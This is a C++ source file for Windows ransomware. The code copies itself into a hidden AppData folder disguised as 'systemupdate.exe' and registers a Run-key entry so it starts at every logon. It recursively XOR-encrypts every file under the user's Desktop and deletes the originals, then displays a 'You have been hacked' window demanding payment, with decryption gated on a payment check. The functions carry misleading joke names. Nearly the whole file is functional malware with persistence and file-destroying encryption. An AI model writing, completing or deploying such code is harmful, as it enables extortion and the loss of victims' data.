#include <windows.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>  // For SHGetFolderPath
#include "resource.h"  // Ensure this is included to access IDB_BACKGROUND_IMAGE
#include "Methods.h";
#include <Shlwapi.h>

bool AddToStartup() {
    HKEY hKey;
    // Open the "Run" key for the current user
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        return false;
    }

    // Get the path of the currently running executable
    wchar_t exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Define the discrete location (e.g., hidden folder in AppData)
    wchar_t newLocation[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, newLocation);
    wcscat(newLocation, L"\\SystemData");
    CreateDirectory(newLocation, NULL); // Create the folder if it doesn't exist

    // Set the new location path for the executable
    wcscat(newLocation, L"\\systemupdate.exe");

    // Copy the executable to the new location
    if (!CopyFile(exePath, newLocation, FALSE)) {
        RegCloseKey(hKey);
        return false;
    }

    // Add the new location to the startup registry
    result = RegSetValueEx(hKey, L"SystemUpdate", 0, REG_SZ, (BYTE*)newLocation, (wcslen(newLocation) + 1) * sizeof(wchar_t));

    // Close the registry key
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS);
}

bool RemoveFromStartup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    if (result != ERROR_SUCCESS) {
        return false;
    }

    // Remove the startup registry entry
    result = RegDeleteValue(hKey, L"SystemUpdate");

    // Close the registry key
    RegCloseKey(hKey);

    // Define the discrete location of the copied file
    wchar_t copiedFilePath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, copiedFilePath);
    wcscat(copiedFilePath, L"\\SystemData\\systemupdate.exe");

    // Try to delete the file directly
    if (!DeleteFile(copiedFilePath)) {
        // If deletion fails (e.g., file is in use), schedule it for deletion on the next reboot
        if (!MoveFileEx(copiedFilePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
            return false; // If this fails, return false
        }
    }

    return true;
}

wchar_t* ConvertToWideString(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    wchar_t* wideStr = new wchar_t[len];
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wideStr, len);
    return wideStr;
}


void DoHappyFun(const wchar_t* filename) {
    char filenameNarrow[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, filename, -1, filenameNarrow, sizeof(filenameNarrow), NULL, NULL);

    std::ifstream inFile(filenameNarrow, std::ios::binary);
    std::ofstream outFile(std::string(filenameNarrow) + ".enc", std::ios::binary);

    // Simple XOR encryption
    char buffer;
    while (inFile.read(&buffer, 1)) {
        buffer ^= 0xFF;
        outFile.write(&buffer, 1);
    }

    inFile.close();
    outFile.close();

    // Delete the original file
    DeleteFile(filename);
}



void EncryptFilesInDirectory(const wchar_t* directoryPath) {
    // Append wildcard for file search
    wchar_t searchPath[MAX_PATH];
    wcscpy(searchPath, directoryPath);
    wcscat(searchPath, L"\\*");

    WIN32_FIND_DATA fileData;
    HANDLE hFind = FindFirstFile(searchPath, &fileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Skip the current and parent directory entries ("." and "..")
            if (wcscmp(fileData.cFileName, L".") != 0 && wcscmp(fileData.cFileName, L"..") != 0) {
                // Create full file path
                wchar_t filePath[MAX_PATH];
                swprintf(filePath, MAX_PATH, L"%s\\%s", directoryPath, fileData.cFileName);

                if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    // Recursively process subdirectories
                    EncryptFilesInDirectory(filePath);
                }
                else {
                    // Check if file is already encrypted by looking for ".encrypted" suffix
                    std::wstring fileName(fileData.cFileName);
                    if (fileName.find(L".enc") == std::wstring::npos) {
                        // Encrypt the file
                        DoHappyFun(filePath);
                    }
                }
            }
        } while (FindNextFile(hFind, &fileData) != 0);
        FindClose(hFind);
    }
}

void NotSus() {
    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

    // Call the recursive function to encrypt files on the desktop and subdirectories
    EncryptFilesInDirectory(desktopPath);
}

void EpicBased(const wchar_t* filename) {
    // Convert wide filename to narrow string for input file stream
    char filenameNarrow[MAX_PATH];
    WideCharToMultiByte(CP_UTF8, 0, filename, -1, filenameNarrow, sizeof(filenameNarrow), NULL, NULL);

    std::ifstream inFile(std::string(filenameNarrow) + ".enc", std::ios::binary);
    std::ofstream outFile(filenameNarrow, std::ios::binary);

    // Simple XOR decryption
    char buffer;
    while (inFile.read(&buffer, 1)) {
        buffer ^= 0xFF;
        outFile.write(&buffer, 1);
    }

    inFile.close();
    outFile.close();

    // Delete the encrypted file
    std::string encryptedFileName = std::string(filenameNarrow) + ".enc";
    DeleteFile(ConvertToWideString(encryptedFileName.c_str()));
}

void DecryptFilesInDirectory(const wchar_t* directoryPath) {
    // Append wildcard for file search
    wchar_t searchPath[MAX_PATH];
    wcscpy(searchPath, directoryPath);
    wcscat(searchPath, L"\\*");

    WIN32_FIND_DATA fileData;
    HANDLE hFind = FindFirstFile(searchPath, &fileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Skip the current and parent directory entries ("." and "..")
            if (wcscmp(fileData.cFileName, L".") != 0 && wcscmp(fileData.cFileName, L"..") != 0) {
                // Create full file path
                wchar_t filePath[MAX_PATH];
                swprintf(filePath, MAX_PATH, L"%s\\%s", directoryPath, fileData.cFileName);

                if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    // Recursively process subdirectories
                    DecryptFilesInDirectory(filePath);
                } else {
                    // Check if the file has the ".encrypted" suffix
                    std::wstring fileName(fileData.cFileName);
                    if (fileName.find(L".enc") != std::wstring::npos) {
                        // Remove ".encrypted" from the file name to get the original name
                        std::wstring originalFileName = fileName.substr(0, fileName.length() - 4);

                        // Create the original file path
                        wchar_t originalFilePath[MAX_PATH];
                        swprintf(originalFilePath, MAX_PATH, L"%s\\%s", directoryPath, originalFileName.c_str());

                        // Decrypt the file using the original file path
                        EpicBased(originalFilePath);
                    }
                }
            }
        } while (FindNextFile(hFind, &fileData) != 0);
        FindClose(hFind);
    }
}

void LolGetRekt() {
    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

    // Call the recursive function to decrypt files on the desktop and subdirectories
    DecryptFilesInDirectory(desktopPath);
}

// Function to check if payment has been received (simulated by a file)
bool LolNothingHereXd() {
    std::ifstream paymentFile("C:\\payment_confirmed.txt");
    return paymentFile.good();
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HBITMAP hBitmap;
    static HFONT hFont; // Font handle
    
    switch (uMsg) {
    case WM_CREATE:
        // Load the bitmap when the window is created
        hBitmap = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_BACKGROUND_IMAGE));
        if (!hBitmap) {
            MessageBox(hwnd, L"Failed to load background image.", L"Error", MB_OK | MB_ICONERROR);
            return -1; // Stop window creation on error
        }

        // Create a font with size 60 and Arial
        hFont = CreateFont(
            60,              // Height of font
            0,               // Average character width
            0,               // Angle of escapement
            0,               // Base-line orientation angle
            FW_NORMAL,       // Font weight
            FALSE,           // Italic
            FALSE,           // Underline
            FALSE,           // Strikeout
            DEFAULT_CHARSET, // Character set identifier
            OUT_OUTLINE_PRECIS, // Output precision
            CLIP_DEFAULT_PRECIS, // Clipping precision
            DEFAULT_QUALITY, // Quality
            VARIABLE_PITCH, // Family of font
            L"Arial"         // Font type
        );

        
        // Create the button
        CreateWindow(
            L"BUTTON",     // Predefined class; Unicode assumed 
            L"Check Payment",  // Button text 
            WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, // Styles 
            425,           // x position 
            580,           // y position 
            200,           // Button width
            50,            // Button height
            hwnd,          // Parent window
            (HMENU)ID_CHECK_PAYMENT_BUTTON,       // Control identifier
            (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), // Instance
            NULL);         // Pointer not needed
        break;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        // Draw the background image
        if (hBitmap) {
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

            BITMAP bitmap;
            GetObject(hBitmap, sizeof(BITMAP), &bitmap);
            BitBlt(hdc, 0, 0, bitmap.bmWidth, bitmap.bmHeight, hdcMem, 0, 0, SRCCOPY);

            SelectObject(hdcMem, hOldBitmap);
            DeleteDC(hdcMem);
        }

        // Set the font
        SelectObject(hdc, hFont);

        // Draw the text
        const wchar_t* message = L"You have been hacked!\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease send payment to:\nbG9sb3duZWRuZXJk";
        SetTextColor(hdc, RGB(255, 255, 255)); // Set text color to white
        SetBkMode(hdc, TRANSPARENT); // Set transparent background for text

        RECT rect;
        GetClientRect(hwnd, &rect);
        DrawText(hdc, message, -1, &rect, DT_CENTER | DT_WORDBREAK | DT_NOPREFIX);

        EndPaint(hwnd, &ps);
        break;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == ID_CHECK_PAYMENT_BUTTON) {
            if (LolNothingHereXd()) {
                MessageBox(hwnd, L"Payment has been confirmed!", L"Payment Status", MB_OK);
                LolGetRekt();
                RemoveFromStartup();
                DeleteObject(hBitmap);
                DeleteObject(hFont); // Delete the font object
                PostQuitMessage(0);
                break;
            }
            else {
                MessageBox(hwnd, L"No payment received. Please make the payment.", L"Payment Status", MB_OK);
                
            }
        }
        break;


    case WM_DESTROY:
        // Cleanup resources
        DeleteObject(hBitmap);
        DeleteObject(hFont); // Delete the font object
        PostQuitMessage(0);
        break;

    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}


void ShowGUI() {
    const wchar_t CLASS_NAME[] = L"RansomwareWindowClass";

    // Register the window class
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc; // Use custom window procedure
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Create the window
    HWND hwnd = CreateWindowEx(
        0,                              // Optional window styles
        CLASS_NAME,                    // Window class
        L"YOU HAVE BEEN OWNED",           // Window text
        WS_OVERLAPPEDWINDOW,           // Window style
        CW_USEDEFAULT, CW_USEDEFAULT,  // Size and position
        1024, 1024,                    // Set the window size to 1024x1024
        NULL,                          // Parent window    
        NULL,                          // Menu
        wc.hInstance,                  // Instance handle
        NULL                           // Additional application data
    );

    // Show the window
    ShowWindow(hwnd, SW_SHOW);

    // Message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Destroy the window when done
    DestroyWindow(hwnd);
}


